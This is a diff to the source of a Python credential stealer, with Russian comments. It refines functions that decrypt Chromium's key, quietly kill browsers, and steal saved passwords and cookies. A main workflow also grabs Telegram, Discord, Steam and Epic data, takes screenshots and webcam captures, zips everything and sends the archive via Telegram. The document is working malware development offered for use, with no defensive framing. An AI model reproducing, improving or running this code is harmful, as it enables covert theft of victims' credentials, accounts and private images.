@@ -325,6 +325,11 @@ def get_encryption_key(browser_path):
         with open(local_state_path, 'r', encoding='utf-8') as f:
             local_state = json.loads(f.read())
         
+        # Проверка наличия ключа os_crypt
+        if "os_crypt" not in local_state:
+            print(f"Ключ 'os_crypt' не найден в {local_state_path}")
+            return None
+            
         encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         encrypted_key = encrypted_key[5:]
         try:
@@ -477,19 +482,24 @@ def steal_passwords():
             try:
                 passwords = []
                 if browser_name == "firefox":
-                    pass
+                    pass  # Firefox пока не поддерживается
                 elif browser_name in browser_paths:
                     path = browser_paths[browser_name]
                     if path.exists():
+                        print(f"Обработка браузера: {display_name}")
                         if platform.system() == "Windows":
                             stealthy_kill_browser(browser_name)
                             time.sleep(1)
                         passwords = steal_chrome_passwords(browser_name, str(path))
+                
+                # Сохраняем пароли только если они есть
                 if passwords:
                     password_file = PASSWORDS_DIR / f"{display_name}_Passwords.json"
                     with open(password_file, 'w', encoding='utf-8') as f:
                         json.dump(passwords, f, indent=4, ensure_ascii=False)
                         print(f"✅ Пароли {display_name} сохранены: {password_file}")
+                else:
+                    print(f"⚠️ Для браузера {display_name} пароли не найдены")
             except Exception as e:
                 print(f"Общая ошибка при краже паролей {browser_name}: {e}")
     except Exception as e:
@@ -529,19 +539,24 @@ def steal_cookies():
                                 'secure': cookie.secure
                             })
                     except:
-                        pass
+                        print(f"⚠️ Не удалось получить куки для Firefox")
                 elif browser_name in browser_paths:
                     path = browser_paths[browser_name]
                     if path.exists():
+                        print(f"Обработка браузера: {display_name}")
                         if platform.system() == "Windows":
                             stealthy_kill_browser(browser_name)
                             time.sleep(1)
                         cookies = steal_chromium_cookies(browser_name, str(path))
+                
+                # Сохраняем куки только если они есть
                 if cookies:
                     cookie_file = COOKIE_DIR / f"{display_name}_Cookies.json"
                     with open(cookie_file, 'w', encoding='utf-8') as f:
                         json.dump(cookies, f, indent=4, ensure_ascii=False)
                         print(f"✅ Куки {display_name} сохранены: {cookie_file}")
+                else:
+                    print(f"⚠️ Для браузера {display_name} куки не найдены")
             except Exception as e:
                 print(f"Общая ошибка при краже куки {browser_name}: {e}")
     except Exception as e:
@@ -631,14 +646,14 @@ def create_zip():
     
     try:
         with zipfile.ZipFile(str(zip_path), 'w', zipfile.ZIP_DEFLATED) as zipf:
-            all_files = []
+            # Собираем все файлы в папке BASE_DIR
             for root, _, files in os.walk(str(BASE_DIR)):
                 for file in files:
                     file_path = Path(root) / file
-                    all_files.append(file_path)
-            for file_path in all_files:
-                arcname = file_path.relative_to(BASE_DIR)
-                zipf.write(str(file_path), str(arcname))
+                    arcname = file_path.relative_to(BASE_DIR)
+                    zipf.write(str(file_path), str(arcname))
+            
+            # Гарантируем включение пустых папок
             empty_folders = [
                 OTHER_DIR,
                 COOKIE_DIR,
@@ -648,8 +663,10 @@ def create_zip():
                 OTHER_DIR / "Telegram",
                 OTHER_DIR / "Discord"
             ]
+            
             for folder in empty_folders:
                 if folder.exists() and folder.is_dir():
+                    # Создаем пустой файл-маркер
                     marker_file = folder / ".keep"
                     try:
                         marker_file.touch(exist_ok=True)
@@ -743,14 +760,20 @@ def main_workflow():
     sys_info = get_system_info()
     with open(BASE_DIR / "system_report.json", 'w', encoding='utf-8') as f:
         json.dump(sys_info, f, indent=4, ensure_ascii=False)
+    
+    # Крадем данные
     steal_cookies()
     steal_passwords()
     steal_telegram_data()
     steal_discord_data()
     steal_steam_data()
     steal_epic_games_data()
+    
+    # Создаем скриншоты
     take_screenshot()
     capture_webcam()
+    
+    # Упаковываем и отправляем
     zip_file = create_zip()
     if zip_file:
         send_to_telegram(zip_file)
